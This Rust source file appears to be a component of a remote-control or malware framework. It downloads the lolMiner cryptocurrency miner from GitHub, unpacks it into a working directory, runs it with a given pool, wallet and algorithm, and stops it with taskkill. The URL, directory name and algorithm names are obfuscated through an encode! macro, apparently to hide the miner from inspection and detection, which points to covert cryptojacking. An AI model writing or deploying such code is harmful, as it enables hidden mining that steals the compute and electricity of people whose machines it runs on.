use std::io::Cursor;
use std::path::Path;

use tracing::*;
use wpkg_macro::*;

use crate::{crypto, info_crypt, utils};

pub const MINER_DIR: &str = encode!("lolminer");
pub const URL: &str = encode!("https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.59/lolMiner_v1.59a_Win64.zip");


#[allow(dead_code)]
pub const ALGORITHMS: [&str; 17] = [encode!("AUTOLYKOS2"), encode!("BEAM-III"), encode!("C29AE"), encode!("C29D"),
                                    encode!("C29M"), encode!("C30CTX"), encode!("C31"), encode!("C32"), encode!("CR29-32"),
                                    encode!("CR29-40"), encode!("CR29-48"), encode!("EQUI144_5"), encode!("EQUI192_7"),
                                    encode!("EQUI210_9"), encode!("ETCHASH"), encode!("ETHASH"), encode!("ZEL")];

pub async fn download_lolminer() -> anyhow::Result<()> {
    if !is_installed()? {
        let path = &format!("{}/{}", utils::get_working_dir()?, wpkg_crypto::decode(MINER_DIR));

        info!("{}{}", crypto!("Unpacking crypto miner to "), &path);
        let zipdata = utils::download_data(
            &wpkg_crypto::decode(URL),
        )
        .await?;

        info_crypt!("Extracting miner...");
        zip_extract::extract(Cursor::new(zipdata), &Path::new(path), true)?;
    } else {
        info_crypt!("Miner is installed")
    }

    Ok(())
}

pub fn is_installed() -> anyhow::Result<bool> {
    Ok(Path::new(&format!("{}/{}", utils::get_working_dir()?, wpkg_crypto::decode(MINER_DIR))).exists())
}

pub fn run_miner(algo: usize, pool: &str, wallet: &str, name: &str) -> anyhow::Result<()> {
    utils::run_process(&format!("{}/{}/lolMiner.exe", utils::get_working_dir()?,
        wpkg_crypto::decode(MINER_DIR)), vec!["--algo", ALGORITHMS[algo], 
                                                    "--pool", pool,
                                                    "--user", &format!("{wallet}.{name}")]
                                                    , false)
}

pub fn stop_miner() -> anyhow::Result<()> {
    utils::run_process("taskkill.exe", vec!["/f", "/im", "lolMiner.exe"], false)
}